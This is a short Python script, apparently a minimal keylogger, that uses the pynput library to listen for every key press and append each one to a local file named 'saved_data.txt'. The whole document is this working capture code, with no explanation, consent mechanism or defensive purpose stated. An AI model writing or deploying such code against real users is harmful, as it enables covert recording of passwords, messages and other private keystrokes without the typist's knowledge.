from os import write
from pynput.keyboard import Listener

def write_to_file(data):
    with open("saved_data.txt","a") as f:
        f.write(str(data))

with Listener(on_press=write_to_file) as l:
    l.join()